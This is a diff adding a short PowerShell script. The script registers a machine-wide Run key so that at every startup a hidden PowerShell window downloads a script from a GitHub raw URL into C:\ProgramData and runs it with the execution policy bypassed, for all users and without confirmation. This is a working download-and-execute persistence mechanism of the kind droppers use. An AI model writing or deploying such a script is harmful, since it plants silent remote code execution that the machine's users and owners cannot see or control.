@@ -1,0 +1,19 @@
+# Script URL
+$ScriptUrl = "https://raw.githubusercontent.com/djameledin/Desktop/refs/heads/main/untitled.ps1"
+
+# Script save location (placed in a public folder accessible by all users)
+$DownloadPath = "C:\ProgramData\startup_script.ps1"
+
+# Run command without confirmation
+$Command = "powershell -WindowStyle Hidden -Command `"Invoke-WebRequest -Uri '$ScriptUrl' -OutFile '$DownloadPath'; powershell -ExecutionPolicy Bypass -File '$DownloadPath'`""
+
+# Registry entry name
+$RegistryName = 'Run_Script_For_All_Users'
+
+# Registry path for all users
+$RegistryPath = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
+
+# Create the entry (requires administrator privileges)
+Set-ItemProperty -Path $RegistryPath -Name $RegistryName -Value $Command
+
+Write-Host "The script will be downloaded and executed automatically for all users at startup."
